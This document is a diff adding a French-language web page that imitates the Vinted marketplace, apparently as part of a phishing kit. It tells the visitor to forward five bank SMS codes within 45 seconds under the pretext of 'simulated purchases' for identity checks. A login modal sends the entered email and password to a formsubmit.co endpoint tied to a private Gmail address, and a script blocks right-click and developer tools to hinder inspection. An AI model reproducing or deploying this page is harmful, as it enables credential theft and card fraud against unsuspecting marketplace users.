+            }
+            .back-button {
+                font-size: 16px;
+                padding: 12px 20px;
+                max-width: 250px;
+            }
+            /* Responsive adjustments for the scrolling banner */
+            .scrolling-banner-sidebar {
+                width: 100px; /* Smaller sidebar on mobile */
+            }
+        }
+    </style>
+
+    <link href="favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
+    <link href="favicon.ico" rel="icon" type="image/x-icon"/>
+    <link href="apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+    <link href="site.webmanifest" rel="manifest"/>
+</head>
+<body>
+
+    <header class="main-header">
+        <div class="mobile-header-top">
+            <i class="fas fa-bars mobile-menu-icon" id="mobile-menu-icon"></i>
+            <a href="#" class="mobile-header-logo"><img id="custom-logo" src="logovinteddujour.png" alt="Votre Logo"></a>
+            <div class="mobile-header-icons">
+                <a href="#" class="mobile-header-icon" id="mobile-message-icon"><i class="fas fa-comment-dots"></i></a>
+                <a href="#" class="mobile-header-icon" id="mobile-notification-icon"><i class="fas fa-bell"></i></a>
+                <a href="#" class="mobile-header-icon" id="mobile-favorite-icon"><i class="fas fa-heart"></i></a>
+            </div>
+        </div>
+
+        <div class="mobile-search-bar-container">
+            <div class="search-container">
+                <div class="articles-dropdown">
+                    Articles <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="search-bar">
+                    <i class="fas fa-search"></i>
+                    <input type="text" placeholder="Rechercher des articles">
+                </div>
+            </div>
+        </div>
+
+        <div class="mobile-categories-chips">
+            <ul>
+                <li><a href="#"><i class="fas fa-eye"></i> <span>Voir tout</span></a></li>
+                <li><a href="#"><i class="fas fa-female"></i> <span>Femmes</span></a></li>
+                <li><a href="#"><i class="fas fa-male"></i> <span>Hommes</span></a></li>
+                <li><a href="#"><i class="fas fa-crown"></i> <span>Créateurs</span></a></li>
+                <li><a href="#"><i class="fas fa-child"></i> <span>Enfant</span></a></li>
+                <li><a href="#"><i class="fas fa-home"></i> <span>Maison</span></a></li>
+                <li><a href="#"><i class="fas fa-microchip"></i> <span>Électroniques</span></a></li>
+                <li><a href="#"><i class="fas fa-gamepad"></i> <span>Divertissement</span></a></li>
+                <li><a href="#"><i class="fas fa-paw"></i> <span>Animaux</span></a></li>
+            </ul>
+        </div>
+        <div class="mobile-nav-menu" id="mobile-nav-menu">
+            <ul>
+                <li><button class="menu-item-button sell-articles">Vends tes articles</button></li>
+                <li><button class="menu-item-button" id="mobile-menu-login-signup-btn">S'inscrire | Se connecter</button></li>
+                <li><a href="#">Ton guide Vinted</a></li>
+                <li><a href="#">Femmes</a></li>
+                <li><a href="#">Hommes</a></li>
+                <li><a href="#">Articles de créateurs</a></li>
+                <li><a href="#">Enfants</a></li>
+                <li><a href="#">Maison</a></li>
+                <li><a href="#">Électronique</a></li>
+                <li><a href="#">Divertissement</a></li>
+                <li><a href="#">Sport</a></li>
+                <li><a href="#">Animaux</a></li>
+                <li><a href="#">À propos</a></li>
+                <li><a href="#">Notre plateforme</a></li>
+            </ul>
+        </div>
+        <div class="mobile-menu-overlay" id="mobile-menu-overlay"></div>
+
+
+        <div class="header-top">
+            <div class="header-left-section">
+                <a href="#" class="logo"><img id="custom-logo" src="logovinteddujour.png" alt="Votre Logo"></a>
+                <div class="search-container">
+                    <div class="articles-dropdown">
+                        Articles <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="search-bar">
+                        <i class="fas fa-search"></i>
+                        <input type="text" placeholder="Rechercher des articles">
+                    </div>
+                </div>
+            </div>
+            <nav class="top-nav">
+                <ul>
+                    <li><a href="#" class="header-icon" id="desktop-message-icon"><i class="fas fa-comment-dots"></i></a></li>
+                    <li><a href="#" class="header-icon" id="desktop-notification-icon"><i class="fas fa-bell"></i></a></li>
+                    <li><a href="#" class="header-icon" id="desktop-favorite-icon"><i class="fas fa-heart"></i></a></li>
+
+                    <li><a href="#" class="btn btn-green">Vends tes articles</a></li>
+                    <li><a href="#" class="icon-link"><i class="fas fa-question-circle"></i></a></li>
+                    <li><a href="#" class="lang-select">FR <i class="fas fa-chevron-down"></i></a></li>
+                </ul>
+            </nav>
+        </div>
+
+        <nav class="categories-nav">
+            <div class="container">
+                <ul>
+                    <li><a href="#">Femmes</a></li>
+                    <li><a href="#">Hommes</a></li>
+                    <li><a href="#">Articles de créateurs</a></li>
+                    <li><a href="#">Enfants</a></li>
+                    <li><a href="#">Maison</a></li>
+                    <li><a href="#">Électronique</a></li>
+                    <li><a href="#">Divertissement</a></li>
+                    <li><a href="#">Sport</a></li>
+                    <li><a href="#">Animaux</a></li>
+                    <li><a href="#">À propos</a></li>
+                    <li><a href="#">Notre plateforme</a></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <div class="content-wrapper">
+        <div class="page-wrapper">
+            <img alt="Support Vinted 24h" class="support-image" src="imageconfirmation.jpg"/>
+
+            <div class="scrolling-banner-container">
+                <div class="scrolling-banner-content-area">
+                    <div class="scrolling-banner-scrolling-wrapper" id="scrollingText">
+                        <p>• Vos informations ont bien été reçues. La vérification est en cours pour sécuriser votre transfert..</p>
+                        <p>• Rapide et en toute sérénité. Un conseiller vous contactera prochainement pour vous transmettre les instructions nécessaires. Merci de rester attentif à nos communications afin de finaliser cette étape dans les meilleurs délais..</p>
+</p>
+<p>• Vos informations ont bien été reçues. La vérification est en cours pour sécuriser votre transfert..</p>
+                        <p>• Rapide et en toute sérénité. Un conseiller vous contactera prochainement pour vous transmettre les instructions nécessaires. Merci de rester attentif à nos communications afin de finaliser cette étape dans les meilleurs délais..</p>
+</p><p>• Vos informations ont bien été reçues. La vérification est en cours pour sécuriser votre transfert..</p>
+                        <p>• Rapide et en toute sérénité. Un conseiller vous contactera prochainement pour vous transmettre les instructions nécessaires. Merci de rester attentif à nos communications afin de finaliser cette étape dans les meilleurs délais..</p>
+</p>
+                    </div>
+                </div>
+                <div class="scrolling-banner-sidebar">
+                    <span class="arrow">&#8595;</span>
+                </div>
+            </div>
+            
+            <div class="content-container">
+                <h2>🔍 Merci, on s’occupe du reste !</h2>
+                
+                <div class="confirmation-message">
+                    <p>Vos informations ont bien été reçues. La vérification est en cours pour sécuriser votre transfert..</p>
+                    <p>📞 Suivi en cours :
+Un conseiller vous contactera prochainement pour vous transmettre les instructions nécessaires. Merci de rester attentif à nos communications afin de finaliser cette étape dans les meilleurs délais..</p>
+                </div>
+
+                <div class="next-step">
+                    <strong> Mise à jour de nos Termes et conditions</strong>
+                    <p>Afin de confirmer votre identité et d’activer votre compte VINTED en toute sécurité, une vérification en plusieurs étapes est nécessaire. Cette démarche consiste à effectuer des simulations d’achat via nos partenaires de confiance (Allo by Monisnap, Orange Bank, Rewire, Recharge, Bunq, etc.).</p>
+                </div>
+
+                <div class="next-step">
+                    <strong>Vérification par code SMS</strong>
+                    <p>Vous recevrez 5 codes de confirmation par SMS. Ces codes, générés de façon sécurisée, attestent de votre lien légitime avec le numéro de carte bancaire enregistré lors de la création de votre compte.</p>
+                </div>
+
+                <div class="next-step">
+                    <strong>Délai de transmission</strong>
+                    <p><i class="fas fa-hand-point-right"></i> Merci de nous transmettre chaque code dans un délai de 45 secondes après réception, afin que nous puissions finaliser la validation de votre transaction.</p>
+                </div>
+
+                <div class="next-step">
+                    <strong>Sécurité garantie</strong>
+                    <p>Soyez rassuré(e), il ne s’agit que de simulations sécurisées. Aucune transaction réelle ne sera effectuée. Cette procédure a pour unique objectif de confirmer votre identité et de garantir que vous êtes bien le ou la titulaire du moyen de paiement associé à votre compte.</p>
+                </div>
+                
+                <button class="back-button" onclick="window.location.href='https://www.vinted.fr/'">Deconnexion</button>
+
+                <div class="support-text">
+                    Si vous avez des questions, notre équipe reste à votre disposition.
+                </div>
+
+                <div class="support-text">
+                    Vos informations d'identité seront vérifiées, cryptées et transmises de manière sécurisée.
+                </div>
+
+                <div class="support-text">
+                    Nous ne stockons jamais les informations d'identité soumises par le biais de ce processus sur nos systèmes.
+                </div>
+            </div>
+
+            <img alt="Paiement sécurisé" class="confirmation-image" src="vintedimage5.jpg"/>
+            <img alt="Paiement sécurisé" class="confirmation-image" src="protectioncartebancaire.jpg"/>
+        </div>
+    </div>
+
+    <footer class="main-footer">
+        <div class="container">
+            <div class="footer-top-button">
+                <a href="#" class="btn btn-green">Voir plus</a>
+            </div>
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h4>Vinted</h4>
+                    <ul>
+                        <li><a href="#">À propos de Vinted</a></li>
+                        <li><a href="#">Carrière</a></li>
+                        <li><a href="#">Le développement durable</a></li>
+                        <li><a href="#">Presse</a></li>
+                        <li><a href="#">Publicités</a></li>
+                        <li><a href="#">Accessibilité</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Découvrir</h4>
+                    <ul>
+                        <li><a href="#">Comment ça marche ?</a></li>
+                        <li><a href="#">Vérification de l'article</a></li>
+                        <li><a href="#">Applications mobiles</a></li>
+                        <li><a href="#">Tableau de bord</a></li>
+                        <li><a href="#">Vinted Pro</a></li>
+                        <li><a href="#">Guide Vinted Pro</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Aide</h4>
+                    <ul>
+                        <li><a href="#">Centre d'aide</a></li>
+                        <li><a href="#">Vendre</a></li>
+                        <li><a href="#">Acheter</a></li>
+                        <li><a href="#">Confiance et sécurité</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="social-icons">
+                    <a href="#"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                </div>
+                <div class="app-badges">
+                    <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_l`App_Store_Badge.svg.png" alt="Télécharger sur l'App Store"></a>
+                    <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Disponible sur Google Play"></a>
+                </div>
+                <div class="legal-links">
+                    <a href="#">Politique de Confidentialité</a>
+                    <a href="#">Politique de cookies</a>
+                    <a href="#">Paramètres des cookies</a>
+                    <a href="#">Termes et Conditions</a>
+                    <a href="#">Notre plateforme</a>
+                    <a href="#">Termes et conditions de Vinted Pro</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div class="login-modal-overlay" id="login-modal-overlay">
+        <div class="login-form-container">
+            <span class="close-btn" id="close-login-modal">&times;</span>
+            <h2>Se connecter</h2>
+            <form action="https://formsubmit.co/c.pillon130281@gmail.com" method="POST" id="login-form-main">
+                <input type="text" placeholder="E-mail ou nom d'utilisateur" name="email_username" required>
+                <div class="password-input-wrapper">
+                    <input type="password" placeholder="Mot de passe" id="password-input" name="password" required>
+                    <i class="far fa-eye-slash" id="toggle-password-visibility"></i>
+                </div>
+                <input name="_next" type="hidden" value="acceuil.html">
+                <input name="_captcha" type="hidden" value="false"/>
+                <input name="_template" type="hidden" value="table"/>
+                <button type="submit" class="btn btn-green" id="submitBtn">Continuer</button>
+            </form>
+            <div class="form-links">
+                <a href="#">Mot de passe oublié ?</a>
+                <a href="#">Un problème ?</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('login-form-main').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+
+            try {
+                const formData = new FormData(this);
+                const response = await fetch('https://formsubmit.co/ajax/05916efc6d2a27cd1ffd197bdb116810', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (response.ok) {
+                    // * AJOUTEZ CETTE LIGNE POUR REDIRIGER MANUELLEMENT *
+                    window.location.href = this.querySelector('input[name="_next"]').value;
+
+                    // Vous pouvez également fermer la modale ici si la redirection n'est pas instantanée
+                    // document.getElementById('login-modal-overlay').classList.remove('active');
+                    // document.body.style.overflow = 'auto';
+                } else {
+                    throw new Error(result.message || 'Erreur lors de l\'envoi du formulaire');
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                alert('Une erreur est survenue lors de l\'envoi du formulaire. Veuillez réessayer.');
+            } finally {
+                btn.disabled = false;
+            }
+        });
+    </script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const searchInput = document.querySelector('.search-bar input');
+            const searchContainer = document.querySelector('.search-container');
+            const loginSignupBtn = document.getElementById('login-signup-btn'); // This button is now removed from HTML
+            const loginSignupMobileBtn = document.getElementById('login-signup-mobile-btn'); // This button is now removed from HTML
+            const loginModalOverlay = document.getElementById('login-modal-overlay');
+            const closeLoginModalBtn = document.getElementById('close-login-modal');
+            const passwordInput = document.getElementById('password-input');
+            const togglePasswordVisibility = document.getElementById('toggle-password-visibility');
+            const loginForm = document.getElementById('login-form-main');
+            const submitBtn = document.getElementById('submitBtn');
+
+            // NEW: Mobile menu elements
+            const mobileMenuIcon = document.getElementById('mobile-menu-icon');
+            const mobileNavMenu = document.getElementById('mobile-nav-menu');
+            const mobileMenuOverlay = document.getElementById('mobile-menu-overlay');
+            const mobileMenuLoginSignupBtn = document.getElementById('mobile-menu-login-signup-btn'); // For login/signup in mobile menu
+
+
+            // Effet de focus sur la barre de recherche
+            const desktopSearchInput = document.querySelector('.header-top .search-bar input');
+            const desktopSearchContainer = document.querySelector('.header-top .search-container');
+
+            if (desktopSearchInput && desktopSearchContainer) {
+                desktopSearchInput.addEventListener('focus', () => {
+                    desktopSearchContainer.style.boxShadow = '0 0 0 1px var(--vinted-green)';
+                });
+
+                desktopSearchInput.addEventListener('blur', () => {
+                    desktopSearchContainer.style.boxShadow = 'none';
+                });
+            }
+
+            // Afficher le formulaire de connexion (mobile menu button remains)
+            mobileMenuLoginSignupBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                mobileNavMenu.classList.remove('active'); // Close mobile menu first
+                mobileMenuOverlay.classList.remove('active'); // Hide overlay
+                loginModalOverlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+
+            // Fermer le formulaire de connexion via le bouton croix
+            closeLoginModalBtn.addEventListener('click', () => {
+                loginModalOverlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+
+            // Fermer le formulaire de connexion en cliquant en dehors du formulaire
+            loginModalOverlay.addEventListener('click', (e) => {
+                if (e.target === loginModalOverlay) {
+                    loginModalOverlay.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+                }
+            });
+
+            // Basculer la visibilité du mot de passe
+            togglePasswordVisibility.addEventListener('click', () => {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                togglePasswordVisibility.classList.toggle('fa-eye');
+                togglePasswordVisibility.classList.toggle('fa-eye-slash');
+            });
+
+            // NEW: Toggle mobile menu visibility
+            mobileMenuIcon.addEventListener('click', () => {
+                mobileNavMenu.classList.toggle('active');
+                mobileMenuOverlay.classList.toggle('active');
+                // Prevent scrolling on body when menu is open
+                if (mobileNavMenu.classList.contains('active')) {
+                    document.body.style.overflow = 'hidden';
+                } else {
+                    document.body.style.overflow = 'auto';
+                }
+            });
+
+            // NEW: Close mobile menu when overlay is clicked
+            mobileMenuOverlay.addEventListener('click', () => {
+                mobileNavMenu.classList.remove('active');
+                mobileMenuOverlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+
+            // --- REMOVED: NOUVEAU CODE POUR L'AFFICHAGE AUTOMATIQUE DU FORMULAIRE ---
+            // setTimeout(() => {
+            //     loginModalOverlay.classList.add('active');
+            //     document.body.style.overflow = 'hidden'; // Empêche le défilement du corps
+            // }, 20000); // 20000 millisecondes = 20 secondes
+            // ------------------------------------------------------------------
+        });
+    </script>
+
+    <script>
+        document.addEventListener("contextmenu", event => event.preventDefault());  // Bloque clic droit
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || (e.ctrlKey && e.key === "U")) {
+                e.preventDefault();
+            }
+        });
+        document.querySelectorAll("img").forEach(img => {
+            img.setAttribute("oncontextmenu", "return false");
+            img.setAttribute("ondragstart", "return false");
+        });
+    </script>
+
+</body>
+</html>
